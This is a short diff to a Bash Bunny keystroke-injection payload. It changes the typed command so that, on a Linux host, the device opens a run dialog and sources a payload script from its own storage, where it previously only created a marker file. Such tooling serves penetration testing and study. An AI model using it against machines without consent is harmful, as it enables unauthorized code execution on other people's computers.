@@ -37,7 +37,8 @@ fi
 
 QUACK ALT F2
 QUACK DELAY 250
-QUACK STRING bash -c \"touch /media/\$USER/BashBunny/loot/LINUX.txt\"
+#QUACK STRING bash -c \"touch /media/\$USER/BashBunny/loot/LINUX.txt\"
+QUACK STRING bash -c \"source /media/\$USER/BashBunny/payloads/arming/payload.sh\"
 QUACK DELAY 250
 QUACK ENTER
 
